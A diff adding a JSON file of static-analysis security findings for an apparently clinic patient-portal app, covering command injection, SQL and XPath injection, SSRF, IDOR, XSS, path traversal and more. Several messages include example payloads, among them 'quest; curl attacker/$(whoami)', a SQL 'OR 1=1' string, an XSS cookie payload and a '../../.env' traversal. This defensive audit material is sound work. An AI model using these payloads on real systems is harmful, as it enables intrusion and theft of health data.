@@ -1,0 +1,537 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.command-injection",
+      "path": "src/lib/lab-requisition.ts",
+      "start": {
+        "line": 25,
+        "col": 5,
+        "offset": 622
+      },
+      "end": {
+        "line": 25,
+        "col": 72,
+        "offset": 689
+      },
+      "extra": {
+        "message": "printLabRequisitionLabel() interpolates the client-supplied labSystem value directly into a child_process.exec() command (`label-print --profile ${labSystem} --mrn ${mrn}`). The /api/documents/requisition-label route passes body.labSystem (any scheduling-staff member's input) with no allowlist, so values such as `quest; curl attacker/$(whoami)` achieve arbitrary OS command execution on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection",
+      "path": "src/app/(app)/admin/actions.ts",
+      "start": {
+        "line": 262,
+        "col": 3,
+        "offset": 8669
+      },
+      "end": {
+        "line": 267,
+        "col": 6,
+        "offset": 8837
+      },
+      "extra": {
+        "message": "reconcileInsuranceAction() interpolates the form field data.memberId into a raw SQL string executed via prisma.$queryRawUnsafe() (ILIKE '%${data.memberId}%'). The zod schema does not neutralize SQL metacharacters, so an admin can inject arbitrary SQL (e.g. memberId of `%' OR 1=1 --`) to extract the whole Patient/User schema. Use a parameterized $queryRaw template.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xpath-injection",
+      "path": "src/lib/consent-index-search.ts",
+      "start": {
+        "line": 34,
+        "col": 27,
+        "offset": 887
+      },
+      "end": {
+        "line": 34,
+        "col": 86,
+        "offset": 946
+      },
+      "extra": {
+        "message": "findConsentDocumentsForLastSearch() concatenates a stored, user-supplied consent category into an XPath query (`//document[category='${category}']/@id`) without the escaping that findConsentDocumentsByCategory() applies via escapeXPathString(). The category is saved server-side from the authenticated caller's own POST body on /api/documents/consent-search, so a patient can inject XPath (e.g. category=`x' or true() or '1'='1`) to widen the document set returned.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-643: XPath Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.privilege-escalation",
+      "path": "src/app/api/continuity/network-handoff/route.ts",
+      "start": {
+        "line": 7,
+        "col": 3,
+        "offset": 266
+      },
+      "end": {
+        "line": 18,
+        "col": 6,
+        "offset": 673
+      },
+      "extra": {
+        "message": "This endpoint is unauthenticated and trusts the x-network-assertion header. decodeNetworkRoleAssertion() (src/lib/corp-directory-client.ts:52-55) merely base64-decodes + JSON.parses the header with no signature verification, and applyNetworkRoleAssertion() (src/lib/network-sso-handoff.ts) escalates the referenced user to role 'clinic_admin' whenever assertion.role == 'clinic_admin'. Any remote attacker can send a forged base64 assertion to promote an arbitrary (known) user id to administrator.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-287: Improper Authentication",
+            "CWE-269: Improper Privilege Management"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.broken-access-control",
+      "path": "src/app/api/patients/[id]/coverage-view/route.ts",
+      "start": {
+        "line": 19,
+        "col": 3,
+        "offset": 696
+      },
+      "end": {
+        "line": 44,
+        "col": 5,
+        "offset": 1260
+      },
+      "extra": {
+        "message": "The coverage-view route gates PHI disclosure (patient name, MRN, recent visit-summary contents) on a purely client-asserted flag: resolveCoverageAccess(body.editScope) returns true when the request body's editScope === 'covering'. No check confirms the clinician actually covers/is assigned to the patient (contrast handoff-view/route.ts which calls verifyCoverageAssignment()). Any logged-in clinician can POST {\"editScope\":\"covering\"} for any patientId and read that chart.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.idor",
+      "path": "src/app/api/visit-summaries/[id]/printable-copy/route.ts",
+      "start": {
+        "line": 16,
+        "col": 3,
+        "offset": 540
+      },
+      "end": {
+        "line": 24,
+        "col": 5,
+        "offset": 966
+      },
+      "extra": {
+        "message": "Any authenticated patient can retrieve any other patient's RELEASED visit summary (diagnosis, care instructions, provider) by supplying an arbitrary summary id. The route checks role==='patient' but never scopes the query to user.patientId (contrast pdf-copy/route.ts which filters patientId). This is an IDOR exposing protected health information.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-200: Exposure of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.ssrf",
+      "path": "src/app/api/continuity/handoff-confirmation/route.ts",
+      "start": {
+        "line": 20,
+        "col": 3,
+        "offset": 622
+      },
+      "end": {
+        "line": 27,
+        "col": 6,
+        "offset": 836
+      },
+      "extra": {
+        "message": "relayHandoffConfirmation() (src/lib/continuity-confirmation-relay.ts) performs an unauthenticated server-side fetch() to the fully attacker-controlled x-partner-callback-url header with no host allowlist (unlike portal-confirmation-relay.ts which pins ALLOWED_CALLBACK_HOSTS). Anyone holding/guessing a 6-digit collab code can target internal hosts/cloud metadata endpoints (SSRF). Collab codes are 6 digits with no rate limiting, so brute force is plausible within the 24h validity.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection",
+      "path": "src/lib/handoff-letter.ts",
+      "start": {
+        "line": 42,
+        "col": 3,
+        "offset": 1254
+      },
+      "end": {
+        "line": 42,
+        "col": 43,
+        "offset": 1294
+      },
+      "extra": {
+        "message": "renderHandoffLetter() builds and executes a shell command via execSync(`pandoc ${src} -o ${out}`) where the format query parameter flows into the output path/extension. The /api/continuity/letter route passes format through without the ALLOWED_FORMATS allowlist used by discharge-letter.ts, so a staff user can supply format like `pdf\" && <command> && \"` to run arbitrary OS commands. Use spawnSync arg arrays and an allowlist.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.stored-xss",
+      "path": "src/app/api/appointments/[id]/queue-ticket/route.ts",
+      "start": {
+        "line": 27,
+        "col": 26,
+        "offset": 802
+      },
+      "end": {
+        "line": 38,
+        "col": 6,
+        "offset": 1121
+      },
+      "extra": {
+        "message": "This route returns text/html built by string-interpolating DB fields \u2014 including appt.reason, which is typed by the patient at booking \u2014 with no HTML encoding. A patient who books with reason `<img src=x onerror=alert(document.cookie)>` stores a payload that executes in the portal origin whenever a staff member opens the queue-ticket URL (e.g. from the kiosk workflow).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Cross-site Scripting"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.session-fixation",
+      "path": "src/lib/auth.ts",
+      "start": {
+        "line": 19,
+        "col": 3,
+        "offset": 480
+      },
+      "end": {
+        "line": 21,
+        "col": 4,
+        "offset": 520
+      },
+      "extra": {
+        "message": "hashToken() is a no-op returning the raw token, so session tokens are stored in plaintext and sessions are keyed purely by the raw cookie value. A DB leak exposes live, replayable session tokens, and because the token is not transformed an attacker who generates a session can fixate that known token as a victim's cookie before the victim logs in (session fixation). Hash with SHA-256 as shift-handoff.ts already does.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-384: Session Fixation",
+            "CWE-916: Password Hash With Insufficient Computational Effort"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.open-redirect",
+      "path": "src/app/api/continuity/handoff-ack/route.ts",
+      "start": {
+        "line": 18,
+        "col": 3,
+        "offset": 590
+      },
+      "end": {
+        "line": 19,
+        "col": 6,
+        "offset": 718
+      },
+      "extra": {
+        "message": "buildHandoffReturnRedirect() (src/lib/continuity-return.ts:11-13) redirects to whatever x-partner-return-url the client supplies via new URL(header, requestUrl) with no allowlist. An attacker with a (6-digit, unauthenticated, brute-forceable) ack code can craft a link that 302-redirects a victim to an arbitrary external phishing origin. The sibling portal confirm-return path correctly validates against ALLOWED_PORTAL_RETURNS.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: Open Redirect"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.header-injection",
+      "path": "src/app/api/documents/handoff-copy/route.ts",
+      "start": {
+        "line": 50,
+        "col": 3,
+        "offset": 1457
+      },
+      "end": {
+        "line": 55,
+        "col": 6,
+        "offset": 1608
+      },
+      "extra": {
+        "message": "doc.title is a patient-supplied upload-time string placed verbatim into the Content-Disposition response header. It is not stripped of CR/LF (referral-copy/route.ts does .replace(/[\\r\\n]/g, ' ')), enabling HTTP response-header injection / splitting (e.g. injecting Set-Cookie or arbitrary headers) when the title contains encoded newlines.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.privilege-escalation",
+      "path": "src/app/api/schedule/kiosk-handoff/route.ts",
+      "start": {
+        "line": 28,
+        "col": 3,
+        "offset": 786
+      },
+      "end": {
+        "line": 40,
+        "col": 6,
+        "offset": 1122
+      },
+      "extra": {
+        "message": "Both kiosk-handoff and workstation-handoff take an arbitrary badgeId from the request and re-point the caller's session at that user with no PIN/password/second factor. Any scheduling-capable staff member can hand their session over to a clinic_admin's or clinician's user id (obtained via directory/roster views) and act as that higher-privilege account.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.path-traversal",
+      "path": "src/app/api/documents/reissue-template/route.ts",
+      "start": {
+        "line": 19,
+        "col": 3,
+        "offset": 627
+      },
+      "end": {
+        "line": 27,
+        "col": 6,
+        "offset": 954
+      },
+      "extra": {
+        "message": "loadIntakeTemplate() (src/lib/intake-templates.ts:13-16) joins the client-supplied variant value onto the templates/intake directory with no basename or containment check before readFileSync. A scheduling-staff user can pass variant=../../.env or similar and download arbitrary readable files. (Sibling loaders loadConsentForm/loadPolicyDocument apply basename+containment; this one does not.)",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.mass-assignment",
+      "path": "src/app/api/patients/[id]/checkin-intake/route.ts",
+      "start": {
+        "line": 19,
+        "col": 3,
+        "offset": 641
+      },
+      "end": {
+        "line": 26,
+        "col": 6,
+        "offset": 849
+      },
+      "extra": {
+        "message": "applySelfCheckinUpdate() (src/lib/checkin-intake.ts:12-17) spreads the raw client JSON body directly into prisma.patient.update({ data: { ...payload } }). A checking-in patient (or staff path) can overwrite arbitrary Patient columns \u2014 including insuranceMemberId/insuranceProvider, dateOfBirth, and other fields never intended for self-service. Validate with an explicit schema (as applyConciergeContactUpdate does).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.mass-assignment",
+      "path": "src/app/api/patients/[id]/care-preferences/route.ts",
+      "start": {
+        "line": 18,
+        "col": 3,
+        "offset": 619
+      },
+      "end": {
+        "line": 19,
+        "col": 6,
+        "offset": 785
+      },
+      "extra": {
+        "message": "The PATCH body is parsed as an arbitrary object and spread unvalidated in applyCarePreferencesUpdate() (src/lib/care-preferences.ts:10-17). Reachable by a patient for their own record and by staff for any patient, this lets a client write arbitrary Patient columns (e.g. insurance fields feeding coverage/eligibility decisions) rather than only the intended preference fields.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.path-traversal",
+      "path": "src/app/api/appointments/booking-widget/branding/route.ts",
+      "start": {
+        "line": 17,
+        "col": 3,
+        "offset": 572
+      },
+      "end": {
+        "line": 23,
+        "col": 6,
+        "offset": 839
+      },
+      "extra": {
+        "message": "storeWidgetBrandingAsset() (src/lib/widget-assets.ts:13-19) writes the raw upload to path.join('public/widget-assets', fileName) where fileName comes from the x-asset-filename header with no basename/extension/content validation. Any staff user can write attacker bytes to arbitrary paths under public/ (e.g. ../routes/\u2026, service-worker.js, next build assets), enabling stored XSS by overwriting static JS/HTML.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal",
+            "CWE-434: Unrestricted Upload of Dangerous File Type"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.cors-misconfiguration",
+      "path": "src/app/api/continuity/lab-status-widget/route.ts",
+      "start": {
+        "line": 13,
+        "col": 3,
+        "offset": 552
+      },
+      "end": {
+        "line": 20,
+        "col": 4,
+        "offset": 822
+      },
+      "extra": {
+        "message": "The lab-status widget reflects any request Origin into Access-Control-Allow-Origin and sets Access-Control-Allow-Credentials: true. Although the endpoint itself requires an API key, the credential-bearing header plus full origin reflection is a permissive CORS policy; the same unchecked origin-reflection pattern appears on the public booking-widget route. Restrict to a fixed partner allowlist (as type-directory-widget does).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.information-disclosure",
+      "path": "src/lib/availability-response.ts",
+      "start": {
+        "line": 44,
+        "col": 5,
+        "offset": 1717
+      },
+      "end": {
+        "line": 49,
+        "col": 7,
+        "offset": 1913
+      },
+      "extra": {
+        "message": "When the client passes responseLevel=full, internal errors are returned to the caller with e.message AND e.stack, exposing server stack traces, file paths, and potentially DB/secrets details to any authenticated user or API-key partner (CWE-209).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.credential-logging",
+      "path": "src/lib/reminder-relay.ts",
+      "start": {
+        "line": 38,
+        "col": 7,
+        "offset": 1113
+      },
+      "end": {
+        "line": 43,
+        "col": 8,
+        "offset": 1297
+      },
+      "extra": {
+        "message": "SMS gateway failures log the entire config object, including accountSid and authToken (the gateway's live Basic-auth secret), to the server log. Anyone who can read logs/aggregators obtains the SMS gateway credentials.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.hardcoded-secret",
+      "path": "src/lib/request-integrity.ts",
+      "start": {
+        "line": 4,
+        "col": 3,
+        "offset": 183
+      },
+      "end": {
+        "line": 6,
+        "col": 4,
+        "offset": 260
+      },
+      "extra": {
+        "message": "The request-integrity HMAC secret falls back to a hardcoded well-known value ('riverside-clinic-request-integrity-secret') when the env var is unset. Because the derived token is HMAC(sessionToken) and the raw session token is stored/transmitted in plaintext (see auth.ts), anyone aware of the default secret can forge valid request tokens and defeat the CSRF protection on the void endpoint. Identical fallback-secret anti-patterns exist in src/lib/relay.ts and src/lib/continuity.ts.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-352: Cross-Site Request Forgery"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
